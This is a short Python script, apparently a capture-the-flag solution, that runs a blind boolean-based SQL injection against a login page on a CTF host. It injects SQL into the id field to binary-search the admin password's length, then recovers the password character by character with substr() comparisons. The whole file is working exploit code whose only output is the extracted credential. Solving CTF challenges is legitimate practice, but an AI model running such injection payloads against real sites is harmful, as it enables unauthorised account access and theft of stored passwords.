def send_request(id_, passwd="''"):
    from urllib import request, parse

    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    data = parse.urlencode({'id': id_, 'pass': passwd}).encode('ascii')
    return request.urlopen(url, data).read().decode('utf-8')


def search_len(low=0, high=100):
    while low + 1 < high:
        mid = (low + high) // 2
        id_ = "admin' AND (SELECT length(pass) FROM user WHERE id='admin') < {}; --".format(mid, )
        response = send_request(id_)

        if len(response) > 2000:  # hit
            high = mid
        else:
            low = mid

    return (low + high) // 2


def search_passwd(len_):
    passwd = ''

    for l in range(len_):
        for c in range(ord('0'), ord('z')):
            c = chr(c)
            id_ = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), {}, 1) = '{}'; --" \
                .format(l + 1, c)
            response = send_request(id_)

            if len(response) > 2000:
                passwd += c
                break

        print('searching passwd:', passwd)

    return passwd


if __name__ == '__main__':
    len_ = search_len()
    print('len:', len_)

    passwd = search_passwd(len_)
    print('passwd:', passwd)
